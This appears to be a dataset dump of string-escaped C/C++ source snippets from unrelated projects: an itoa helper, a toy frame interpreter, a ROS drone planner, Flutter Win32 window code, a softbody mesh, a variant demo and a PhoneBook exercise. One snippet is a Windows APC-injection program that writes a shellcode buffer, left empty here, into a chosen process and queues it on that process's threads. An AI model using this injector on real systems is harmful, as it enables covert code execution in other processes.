nbr)\r\n{\r\n\tunsigned int\tsize;\r\n\r\n\tif (nbr == 0)\r\n\t\treturn (1);\r\n\tsize = 0;\r\n\twhile (nbr != 0)\r\n\t{\r\n\t\tnbr = nbr / 10;\r\n\t\tsize++;\r\n\t}\r\n\treturn (size);\r\n}\r\n\r\nstatic void\tft_put_result(char *res, unsigned int nbr)\r\n{\r\n\twhile (nbr != 0)\r\n\t{\r\n\t\t*res = nbr % 10 + 48;\r\n\t\tnbr = nbr / 10;\r\n\t\tres--;\r\n\t}\r\n}\r\n\r\nstd::string\tft_itoa(int n)\r\n{\r\n\tchar\t\t\t*res;\r\n\tunsigned int\tnbr;\r\n\tunsigned int\tsize;\r\n\tstd::string\t\tresult;\r\n\r\n\tif (n < 0)\r\n\t{\r\n\t\tnbr = -n;\r\n\t\tsize = ft_size_result(nbr) + 1;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tnbr = n;\r\n\t\tsize = ft_size_result(nbr);\r\n\t}\r\n\tres = (char *) malloc(sizeof(char) * size + 1);\r\n\tif (!res)\r\n\t\treturn (0);\r\n\tif (n < 0)\r\n\t\tres[0] = '-';\r\n\tres[size] = 0;\r\n\tif (n == 0)\r\n\t\tres[0] = 48;\r\n\tft_put_result(res + size - 1, nbr);\r\n\tresult = res;\r\n\tfree(res);\r\n\treturn (result);\r\n}\r\n",
    "// This is preliminary experiment for C++ Frame Engine Project\n\n// Project status: toy\n// Requires: C++23 is the target. seriously. need features. absolutely. minimal support is llvm17 -std=c++23\n// Author: The Old Man\n// License: Public Domain\n// Flaws: it's a demonstrator of mechanics design. for the sake of explanation clarity, it does not care about exceptions. don't use for production\n\n#include <iostream>\n#include <string>\n#include <sstream>\n#include <iomanip>\n#include <utility>\n#include <initializer_list>\n\n#include <deque>\n#include <stack>  \n#include <map>\n#include <list>\n\n// Frame.\n// Frame is a fundamental concept here\n// This one is an exemplary frame, not generic one. in project, frame will become a templated abstraction \n// Frame is a closure for a frame-specific language. we construct an interpreter for that language\n//   - the language construction here is not part of the frame by design, to demonstrate ability to augment foreign c++ objects for scripting.\n//   - interpreter endorsing the frame has two layers: outer, which uses symbols and inner, which uses atoms\n//   - at first glance, symbolic language constructed in this demonstrator may look like Forth, but it is not.\n//     it is not structured. it has numerals but no literals. it has no flow control. it is not Turing-complete. it is not recursive.\n//     it reflects C++ functions, by declarations. consider it rather imperative command language, like JCL or Unix shells. this is by design.\n//   - we call specific execution model represented by constructed interpreter a Frame Machine\n// Frame-related primitives may be global/external functions or functions templates, operating on frame or independently callable \n//    this is demonstrated by process control and RPN arithmetic mechanic on frame's data stack container\n// Alternatively, a frame may provide its own primitive methods \n//    this is demonstrated by boolean flag indicator which is an embedded part of frame\n// Very large frames could provide their own exposed primitives vocabulary suitable for frame composition\n//    this is not demonstrated here yet\n// Generally we combine operators on frame and operators on structures embedded in frame into one symbolic language\n//    finally, a simple console is implemented for play with the frame. This makes whole contraption looking like an interpreter\n\nclass FRAME {\npublic:\n  std::stack<int> data_stack; // forth-like RPN arithmetic data stack\n  // in c++ standard, std::stack is an adapter to std::deque, which is (by standard) already a tree, for adequate complexity.\n  // therefore, we recommend using deque for more advanced structured frames.\n\n  int base = 10; // numeric base setter. stores an integer. this is a kludge for ye olde compiler\n  // std::ios_base& base (std::ios_base&) = std::ios_base::dec; // iomanip base setter. stores a value for ostream manipulator\n\nprivate:  \n  bool flag; // some fancy indicator which just demonstrates a hidden part of this frame, accessible by tokens only\n  // such kind of frame augmenting can be done to any c++ object, turning it into a scriptable machine\n\npublic:  // expose indicator flag manipulators, as usual in getters/setters common pattern\n  void _FLAG_SET (void);\n  void _FLAG_RESET (void);\n  void _FLAG_QUERY (void);\n  void _FLAG_STORE (void);\n  \n} frame; // let's have one\n\n// implementations of exposed member functions\nvoid FRAME::_FLAG_SET (void) { flag = true; };\nvoid FRAME::_FLAG_RESET (void) { flag = false; };\nvoid FRAME::_FLAG_QUERY (void) { data_stack.push(flag); };\nvoid FRAME::_FLAG_STORE (void) {\n    if (data_stack.empty()) {    \n      std::cerr << \"Warning: missing value, flag set operation ignored by frame\" << std::endl;\n      return;\n    }\n    flag = data_stack.top();\n    data_stack.pop();\n};\n\n// atoms.\n// some naive atoms for defined primitives, applicable to that frame\n// atoms are acting radicals, represented as integers in all internal mechanics. may evolve into typed cells in far future\n// atoms are not part of frame definition because in other complex execution model\n// there may be more frames present accessible to common outer language, sharing atoms logically\n// in project, atoms will become employed in prasers, combined, functional programming or/and logical programming execution models of advanced frames. this is by design\n// in procedural programming execution model (which is demonstrated here by this frame), atoms serve as opcodes to primitives\n// our long term goal of the project is to fuse procedural, functional and logical programming paradigms into one hybrid execution model \n\n// our atoms here are simple enum, because in this toy they are static. dynamic atoms creation (by jit compilers for example)\n// and frame composition shall require some better organized integers (like, atomspace arrays or intervals)\ntypedef enum {\n  // magical atom\n  UNDEFINED = 0,\n  // platform process control\n  HELLO, EXIT, ABORT, HELP, QUIT,\n  // arithmetic constants\n  ZERO, ONE, TWO, THREE, \n  //",
    "#include \"local_planning.h\"\n#include <cmath>\n\nnamespace Local_Planning{\n// \u5c40\u90e8\u89c4\u5212\u7b97\u6cd5 \u521d\u59cb\u5316\u51fd\u6570\nvoid Local_Planner::init(ros::NodeHandle& nh){\n    // \u53c2\u6570\u8bfb\u53d6\n    // \u6fc0\u5149\u96f7\u8fbe\u6a21\u578b,0\u4ee3\u88683d\u96f7\u8fbe,1\u4ee3\u88682d\u96f7\u8fbe\n    // 3d\u96f7\u8fbe\u8f93\u5165\u7c7b\u578b\u4e3a <sensor_msgs::PointCloud2> 2d\u96f7\u8fbe\u8f93\u5165\u7c7b\u578b\u4e3a <sensor_msgs::LaserScan>\n    nh.param(\"local_planner/lidar_model\", lidar_model, 0);\n    // \u6700\u5927\u901f\u5ea6\n    nh.param(\"local_planner/max_planning_vel\", max_planning_vel, 0.4);\n\n    // \u8ba2\u9605\u76ee\u6807\u70b9\n    goal_sub = nh.subscribe(\"/prometheus/planning/goal\", 1, &Local_Planner::goal_cb, this);\n    // \u8ba2\u9605 \u65e0\u4eba\u673a\u72b6\u6001\n    drone_state_sub = nh.subscribe<prometheus_msgs::DroneState>(\"/prometheus/drone_state\", 10, &Local_Planner::drone_state_cb, this);\n    // \u8ba2\u9605\u4f20\u611f\u5668\u70b9\u4e91\u4fe1\u606f,\u8be5\u8bdd\u9898\u540d\u5b57\u53ef\u5728launch\u6587\u4ef6\u4e2d\u4efb\u610f\u6307\u5b9a\n    if (lidar_model == 0){\n        local_point_clound_sub = nh.subscribe<sensor_msgs::PointCloud2>(\"/prometheus/sensors/3Dlidar_scan\", 1, &Local_Planner::localcloudCallback, this);\n    }else if (lidar_model == 1){\n        local_point_clound_sub = nh.subscribe<sensor_msgs::LaserScan>(\"/prometheus/planning/local_pcl\", 1, &Local_Planner::laserscanCallback, this);\n    }\n\n    // \u53d1\u5e03 \u671f\u671b\u901f\u5ea6\n    command_pub = nh.advertise<prometheus_msgs::ControlCommand>(\"/prometheus/control_command\", 10);\n    // \u53d1\u5e03\u901f\u5ea6\u7528\u4e8e\u663e\u793a\n    rviz_vel_pub = nh.advertise<geometry_msgs::Point>(\"/prometheus/local_planner/desired_vel\", 10); \n\n    // \u5b9a\u65f6\u51fd\u6570,\u6267\u884c\u5468\u671f\u4e3a1Hz\n    mainloop_timer = nh.createTimer(ros::Duration(0.2), &Local_Planner::mainloop_cb, this);\n    // \u63a7\u5236\u5b9a\u65f6\u5668\n    control_timer = nh.createTimer(ros::Duration(0.05), &Local_Planner::control_cb, this);\n\n    // \u8bbe\u7f6ecout\u7684\u7cbe\u5ea6\u4e3a\u5c0f\u6570\u70b9\u540e\u4e24\u4f4d\n    std::cout << std::fixed << std::setprecision(2);\n\n    cout << \"[planner] APF-Planner initialized!\" << endl;\n\n    // \u9009\u62e9\u907f\u969c\u7b97\u6cd5\n        local_alg_ptr.reset(new APF);\n        local_alg_ptr->init(nh);\n\n    // \u89c4\u5212\u5668\u72b6\u6001\u53c2\u6570\u521d\u59cb\u5316\n    exec_state = EXEC_STATE::WAIT_GOAL;\n    goal_ready = false;\n    path_ok = false;\n\n    // \u521d\u59cb\u5316\u53d1\u5e03\u7684\u6307\u4ee4\n    Command_Now.header.stamp = ros::Time::now();\n    Command_Now.Mode  = prometheus_msgs::ControlCommand::Idle;\n    Command_Now.Command_ID = 0;\n    Command_Now.source = NODE_NAME;\n    desired_yaw = 0.0;\n\n    // \u5730\u56fe\u521d\u59cb\u5316\n    sensor_msgs::PointCloud2ConstPtr init_local_map(new sensor_msgs::PointCloud2());\n    local_map_ptr_ = init_local_map;\n\n    ros::spin();\n}\n\nvoid Local_Planner::goal_cb(const geometry_msgs::PoseStampedConstPtr& msg){\n        goal_pos << msg->pose.position.x, msg->pose.position.y, _DroneState.position[2];\n    goal_vel.setZero();\n    goal_yaw = 2 * std::atan2(msg->pose.orientation.z, msg->pose.orientation.w);\n\n    goal_ready = true;\n}\n\nvoid Local_Planner::drone_state_cb(const prometheus_msgs::DroneStateConstPtr& msg){\n    _DroneState = *msg;\n\n        start_pos << msg->position[0], msg->position[1], msg->position[2];\n        start_vel << msg->velocity[0], msg->velocity[1], msg->velocity[2];\n\n    Drone_odom.header = _DroneState.header;\n    Drone_odom.child_frame_id = \"base_link\";\n    Drone_odom.pose.pose.position.x = _DroneState.position[0];\n    Drone_odom.pose.pose.position.y = _DroneState.position[1];\n    Drone_odom.pose.pose.position.z = _DroneState.position[2];\n    Drone_odom.pose.pose.orientation = _DroneState.attitude_q;\n    Drone_odom.twist.twist.linear.x = _DroneState.velocity[0];\n    Drone_odom.twist.twist.linear.y = _DroneState.velocity[1];\n    Drone_odom.twist.twist.linear.z = _DroneState.velocity[2];\n\n    local_alg_ptr->set_odom(Drone_odom);\n}\n\nvoid Local_Planner::laserscanCallback(const sensor_msgs::LaserScanConstPtr &msg){\n    sensor_msgs::LaserScan::ConstPtr _laser_scan;\n\n    _laser_scan = msg;\n\n    pcl::PointCloud<pcl::PointXYZ> _pointcloud;\n\n    _pointcloud.clear();\n    pcl::PointXYZ newPoint;\n    double newPointAngle;\n\n    int beamNum = _laser_scan->ranges.size();\n    for (int i = 0; i < beamNum; i++){\n        newPointAngle = _laser_scan->angle_min + _laser_scan->angle_increment * i;\n        newPoint.x = _laser_scan->ranges[i] * cos(newPointAngle);\n        newPoint.y = _laser_scan->ranges[i] * sin(newPointAngle);\n        newPoint.z = _DroneState.position[2];\n        _pointcloud.push_back(newPoint);\n    }\n\n    pcl_ptr = _pointcloud.makeShared();\n    local_alg_ptr->set_local_map_pcl(pcl_ptr);\n\n    latest_local_pcl_ = *pcl_ptr; \n}\n\nvoid Local_Planner::localcloudCallback(const sensor_msgs::PointCloud2ConstPtr &msg){\n    local_map_ptr_ = msg;\n    local_alg_ptr->set_local_map(local_map_ptr_);\n\n    pcl::fromROSMsg(*msg, latest_local_pcl_);\n}\n\nvoid Local_Planner::control_cb(const ros::TimerEvent& e)\n{\n    if(!path_ok)\n    {\n        return;\n    }\n\n    distance_to_goal = (start_pos - goal_pos).norm();\n\n    // \u62b5\u8fbe\u7ec8\u70b9\n    if(distance_to_goal < MIN_DIS){\n        Command_Now.header.stamp = ros::Time::now();\n        Command_Now.Mode                                = prometheus_msgs::ControlCommand::Move;\n        Command_Now.Command_ID                          = Command_Now.Command_ID + 1;\n        Command_Now.source = NODE_NAME;\n        Command_Now.Reference_State.Move_mode           = prometheus_msgs::PositionReference::XYZ_POS;\n        Command_Now.Reference_State.Move_frame  ",
    "#include <iostream>\n#include <windows.h>\n#include <psapi.h>\n#include <tlhelp32.h>\n\nvoid RunAPC(LPVOID pVirtualMem, int iProcID);\n\nint main()\n{\n\tDWORD dwProcList[1024];\n\tDWORD dwBytesWritten;\n\tDWORD dwOldProtect = 0;\n\tHANDLE hProc;\n\tSIZE_T bytesWritten;\n\tint PID, counter = 0;\n\tchar cProcName[100];\n\tunsigned char shellcode[] = \"\";\n\n\tprintf(\"Type PID: \");\n\tscanf_s(\"%d\", &PID);\n    EnumProcesses(dwProcList, sizeof(dwProcList), &dwBytesWritten);\n\n    while(counter < (dwBytesWritten / 4)) {\n\t\thProc = OpenProcess(PROCESS_ALL_ACCESS, 0, dwProcList[counter]);\n        if (GetModuleBaseNameA(hProc, NULL, cProcName, 100)) {\n\t\t\tif (dwProcList[counter] == PID) {\n\t\t\t\tprintf(\"PROCCESS NAME - %s\\n\", cProcName);\n\t\t\t\tLPVOID pVirtualMem = VirtualAllocEx(hProc, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);\n\t\t\t\tWriteProcessMemory(hProc, pVirtualMem, shellcode, (SIZE_T)sizeof(shellcode), &bytesWritten);\n\t\t\t\tVirtualProtectEx(hProc, pVirtualMem,(SIZE_T)sizeof(shellcode), PAGE_EXECUTE_READ, &dwOldProtect);\n\t\t\t\tRunAPC(pVirtualMem,dwProcList[counter]);\n\t\t\t}\n            CloseHandle(hProc);\n        }\n\t\tcounter++;\n    }\n}\n\nvoid RunAPC(LPVOID pVirtualMem, int iProcId) {\n\tTHREADENTRY32 thEntry;  thEntry.dwSize = sizeof(THREADENTRY32);\n\tHANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); // alert -> AV\n\n\tif (hSnapshot == INVALID_HANDLE_VALUE) {\n\t\tprintf(\"Error Openning the function\");\n\t\tCloseHandle(hSnapshot);\n\t}\n\n\tfor (Thread32First(hSnapshot, &thEntry); Thread32Next(hSnapshot, &thEntry);) {\n\t\tif (thEntry.th32OwnerProcessID == iProcId) {\n\t\t\tHANDLE target_thread_handle = OpenThread(THREAD_ALL_ACCESS, NULL, thEntry.th32ThreadID);\n\t\t\tprintf(\"PROC [%d] ThreadID: %d\\n\", thEntry.th32OwnerProcessID, thEntry.th32ThreadID);\n\t\t\tQueueUserAPC((PAPCFUNC)pVirtualMem, target_thread_handle, NULL);\n\t\t}\n\t}\n\tCloseHandle(hSnapshot);\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"physics/SoftbodyMesh.hpp\"\n\nSoftbodyMesh::SoftbodyMesh(const Mesh &mesh) {\n  // Create point masses\n  for (const auto &vertex : mesh._vertices) {\n    PointMass pointMass;\n    pointMass.position = vertex.position;\n    pointMass.uv = vertex.uv;\n    pointMass.normal = vertex.normal;\n    pointMass.velocity = glm::vec3(0.0f);\n\n    pointMasses.push_back(pointMass);\n  }\n\n  // Create faces\n  for (unsigned int i = 0; i < mesh._indices.size(); i += 3) {\n    SoftbodyFace face;\n    face.pointMassIndices[0] = mesh._indices[i];\n    face.pointMassIndices[1] = mesh._indices[i + 1];\n    face.pointMassIndices[2] = mesh._indices[i + 2];\n\n    faces.push_back(face);\n  }\n\n  // Create edges\n  for (unsigned int i = 0; i < faces.size(); i++) {\n    for (unsigned int j = 0; j < 3; j++) {\n      unsigned int a = faces[i].pointMassIndices[j];\n      unsigned int b = faces[i].pointMassIndices[(j + 1) % 3];\n\n      // Check if the edge already exists\n      bool edgeExists = false;\n      for (auto &edge : edges) {\n        if ((edge.pointMassIndices[0] == a && edge.pointMassIndices[1] == b) ||\n            (edge.pointMassIndices[0] == b && edge.pointMassIndices[1] == a)) {\n          // The edge already exists, add the current face to the edge\n          edge.faceIndices[1] = i;\n          edgeExists = true;\n          break;\n        }\n      }\n      if (edgeExists) {\n        continue;\n      }\n\n      // Create a new edge\n      SoftbodyEdge edge;\n      edge.pointMassIndices[0] = a;\n      edge.pointMassIndices[1] = b;\n\n      edge.faceIndices[0] = i;\n\n      edge.restLength =\n          glm::length(pointMasses[a].position - pointMasses[b].position);\n\n      edges.push_back(edge);\n    }\n  }\n\n  // Calculate the rest angles of the edges\n  // for (auto &edge : edges) {\n  //   const SoftbodyFace &face0 = faces[edge.faceIndices[0]];\n  //   const SoftbodyFace &face1 = faces[edge.faceIndices[1]];\n  //   unsigned int i0 = edge.pointMassIndices[0];\n  //   unsigned int i1 = edge.pointMassIndices[1];\n  //   unsigned int i2 = 0;\n  //   for (unsigned int i = 0; i < 3; i++) {\n  //     unsigned int pointIdx = face0.pointMassIndices[i];\n  //     if (pointIdx != i0 && pointIdx != i1) {\n  //       i2 = pointIdx;\n  //       break;\n  //     }\n  //   }\n  //   unsigned int i3 = 0;\n  //   for (unsigned int i = 0; i < 3; i++) {\n  //     unsigned int pointIdx = face1.pointMassIndices[i];\n  //     if (pointIdx != i0 && pointIdx != i1) {\n  //       i3 = pointIdx;\n  //       break;\n  //     }\n  //   }\n  //   const PointMass &p0 = pointMasses[i0];\n  //   const PointMass &p1 = pointMasses[i1];\n  //   const PointMass &p2 = pointMasses[i2];\n  //   const PointMass &p3 = pointMasses[i3];\n  //\n  //   // The three edges\n  //   glm::vec3 eM = p1.position - p0.position;\n  //   glm::vec3 eL = p2.position - p0.position;\n  //   glm::vec3 eR = p3.position - p0.position;\n  //\n  //   // Calculate the normals\n  //   glm::vec3 n0 = glm::normalize(glm::cross(eM, eL));\n  //   glm::vec3 n1 = glm::normalize(glm::cross(eM, eR));\n  //\n  //   // Calculate the rest angle\n  //   edge.restAngle = std::acos(glm::dot(n0, n1));\n  // }\n\n  // Calculate the rest span length of the faces\n  for (auto &edge : edges) {\n    unsigned int i0 = edge.pointMassIndices[0];\n    unsigned int i1 = edge.pointMassIndices[1];\n    unsigned int iL = 0;\n    for (unsigned int i = 0; i < 3; i++) {\n      unsigned int pointIdx = faces[edge.faceIndices[0]].pointMassIndices[i];\n      if (pointIdx != i0 && pointIdx != i1) {\n        iL = pointIdx;\n        break;\n      }\n    }\n    unsigned int iR = 0;\n    for (unsigned int i = 0; i < 3; i++) {\n      unsigned int pointIdx = faces[edge.faceIndices[1]].pointMassIndices[i];\n      if (pointIdx != i0 && pointIdx != i1) {\n        iR = pointIdx;\n        break;\n      }\n    }\n\n    // The two points of the faces that are not part of the edge\n    edge.neighborIndices[0] = iL;\n    edge.neighborIndices[1] = iR;\n    const PointMass &pL = pointMasses[iL];\n    const PointMass &pR = pointMasses[iR];\n\n    // Calculate the rest span length\n    edge.restSpanLength = glm::length(pL.position - pR.position);\n  }\n\n  // Calculate the volume of the mesh\n  restVolume = 0.0f;\n  for (const auto &face : faces) {\n    glm::vec3 a = pointMasses[face.pointMassIndices[0]].position;\n    glm::vec3 b = pointMasses[face.pointMassIndices[1]].position;\n    glm::vec3 c = pointMasses[face.pointMassIndices[2]].position;\n\n    float volume = glm::dot(a, glm::cross(b, c)) / 6.0f;\n    restVolume += volume;\n\n    // Calculate the inverse mass\n    float mass = volume / 3.0f;\n    for (unsigned int i = 0; i < 3; i++) {\n      pointMasses[face.pointMassIndices[i]].invMass += mass;\n    }\n  }\n  restVolume = std::fabs(restVolume);\n\n  // Cap the inverse mass at 4 times the target to prevent instability\n  float targetInvMass = pointMasses.size() / restVolume;\n  for (auto &pointMass : pointMasses) {\n    pointMass.invMass = 1.0f / pointMass.invMass;\n    pointMass.invMass =\n        std::min(std::fabs(pointMass.invMass), targetInvMass * 4.0f);\n  }\n}",
    "#include\"Variant.hpp\"\n#include\"Logger.hpp\"\n#include\"variant_to_string.hpp\"\n#include\"FunctionMacro.hpp\"\n\nFunction_Begin(get_type_name,String const)\nParameter(Variant,any)\n    if(any.is_null()){\n        return \"null\";\n    }else if(any.is_boolean()){\n        return \"boolean\";\n    }else if(any.is_number()){\n        return \"number\";\n    }else if(any.is_string()){\n        return \"string\";\n    }else if(any.is_array()){\n        return \"array\";\n    }else if(any.is_object()){\n        return \"object\";\n    }else if(any.is_function()){\n        return \"function\";\n    }\n    return \"undefined\";\nFunction_End\n\nauto lambda_get_type_name=\n    Lambda_Begin(String const)\n    Parameter(Variant const,any)\n        return ::get_type_name(any);\n    Lambda_End;\n\nint main(int argc,char* argv[]){\n    static_assert(sizeof(Variant)<=sizeof(void*));\n    Variant variant=Object{\n        {\"null\",Null{}},\n        {\"boolean\",true},\n        {\"integer\",-1},\n        {\"float\",3.14},\n        {\"character\",'A'},\n        {\"string\",\"hello\"},\n        {\"array\",\n            Array{\n                Null{},false,1,-3.14,'B',\"world\",\n                Array{1,2},Object{{\"name\",\"Tom\"},{\"age\",20}},\n                Lambda_Begin(Null)\n                Parameter(Number const,num1)\n                Parameter(Number const,num2)\n                    ::std::cout<<num1<<num2<<\"\\n\";\n                Lambda_End\n            },\n        },\n        {\"set_value\",\n            Lambda_Begin(Null,&variant)\n            Parameter(String const,name)\n            Parameter(Number const,age)\n                variant.object()[\"name\"]=name;\n                variant.object()[\"age\"]=age;\n            Lambda_End\n        }\n    };\n    variant.object()[\"set_value\"].function().Invoke(\"Jerry\",114514);\n    Logger::info(variant_to_string(variant));\n    BoxManager<typename Variant::value_type>::print_object_pool();\n    BoxManager<typename Variant::value_type>::print_memory_pool();\n    return 0;\n}",
    "# include \"PhoneBook.hpp\"\n\nPhoneBook::PhoneBook(void) : _nbrContacts(0)\n{\n\tstd::cout << \"PhoneBook created\" << std::endl;\n\treturn ;\n}\n\nPhoneBook::~PhoneBook(void)\n{\n\tstd::cout << \"PhoneBook destroyed\" << std::endl;\n\treturn ;\n}\n\nvoid\tPhoneBook::addContact(void)\n{\n\tContact newContact;\n\tstd::string firstName;\n\tstd::string lastName;\n\tstd::string nickName;\n\tstd::string phoneNumber;\n\tstd::string darkestSecret;\n\n\tdo\n\t{\n\t\tstd::cout << \"Enter first name: \";\n\t\tif(!getline(std::cin, firstName))\n\t\t\tstd::exit(1);\n\t} while (!isaString(firstName));\n\tnewContact.setFirstName(firstName);\n\tdo\n\t{\n\t\tstd::cout << \"Enter last name: \";\n\t\tif(!getline(std::cin, lastName))\n\t\t\tstd::exit(1);\n\t} while (!isaString(lastName));\n\tnewContact.setLastName(lastName);\n\tdo\n\t{\n\t\tstd::cout << \"Enter nickname: \";\n\t\tif(!getline(std::cin, nickName))\n\t\t\tstd::exit(1);\n\t} while (!isaNick(nickName));\n\tnewContact.setNickname(nickName);\n\tdo\n\t{\n\t\tstd::cout << \"Enter phone number: \";\n\t\tif(!getline(std::cin, phoneNumber))\n\t\t\tstd::exit(1);\n\t} while (!isaPnumber(phoneNumber));\n\tnewContact.setPhoneNumber(phoneNumber);\n\tdo\n\t{\n\t\tstd::cout << \"Enter darkest secret: \";\n\t\tif(!getline(std::cin, darkestSecret))\n\t\t\tstd::exit(1);\n\t} while (!isaSentence(darkestSecret));\n\tnewContact.setDarkestSecret(darkestSecret);\n\tif (this->_nbrContacts < 8)\n\t{\n\t\tthis->_contacts[this->_nbrContacts] = newContact;\n\t\tthis->_nbrContacts++;\n\t\tnewContact.setIndex(this->_nbrContacts);\n\t}\n\telse\n\t{\n\t\tfor(int i = 0; i < 7; i++)\n\t\t\tthis->_contacts[i] = this->_contacts[(i + 1)]; \n\t\tthis->_contacts[7] = newContact;\t\n\t}\n\treturn ;\n}\nvoid PhoneBook::searchContact(void)\n{\n\tstd::string index;\n\tstd::cout << \"Search contact\" << std::endl;\n\tprintTable(_contacts);\n\twhile (true)\n\t{\n\t\tstd::cout << \"Enter index: \";\n\t\tif(!getline(std::cin, index))\n\t\t\tstd::exit(1);\n\t\tif (index[0] < '0' || index[0] >= getnbrContacts() + '0' || index[1] != '\\0')\n\t\t\tstd::cout << \"Invalid index\" << std::endl;\n\t\telse\n\t\t{\n\t\t\tprintContact(index[0] - '0');\n\t\t\tbreak;\n\t\t}\n\t}\n\treturn ;\n}\n\nvoid PhoneBook::printTable(Contact *contact)\n{\n\t(void)contact;\n\tstd::string firstName;\n\tstd::string lastName;\n\tstd::string nickName;\n\n\tstd::cout << \"|     Index|First name| Last name|  Nickname|\" << std::endl;\n\tfor (int i = 0; i < this->_nbrContacts; i++)\n\t{\n\t\tfirstName = this->_contacts[i].getFirstName();\n\t\tlastName = this->_contacts[i].getLastName();\n\t\tnickName = this->_contacts[i].getNickname();\n\t\tstd::cout << \"|         \" << i << \"|\"; \n\t\tprintMember(firstName);\n\t\tprintMember(lastName);\n\t\tprintMember(nickName);\n\t\tstd::cout << std::endl;\t\n\t}\n\t\n\treturn ;\n}\n\nvoid PhoneBook::printMember(std::string member)\n{\n\tint j\t= 0;;\n\twhile (member[j])\n\t\t\tj++;\n\t\tif (j > 10)\n\t\t\tmember = member.substr(0, 9) + \".\";\n\t\twhile(j++ < 10)\n\t\t\tstd::cout << \" \";\n\t\tstd::cout << member << \"|\";\n\treturn ;\n}\n\nint PhoneBook::getnbrContacts(void) const\n{\n\treturn (this->_nbrContacts);\n}\n\n\nvoid PhoneBook::printContact(int index)\n{\n\tstd::string firstName;\n\tstd::string lastName;\n\tstd::string nickname;\n\tstd::string phoneNumber;\n\tstd::string darkestSecret;\n\n\tfirstName = this->_contacts[index].getFirstName();\n\tlastName = this->_contacts[index].getLastName();\n\tnickname = this->_contacts[index].getNickname();\n\tphoneNumber = this->_contacts[index].getPhoneNumber();\n\tdarkestSecret = 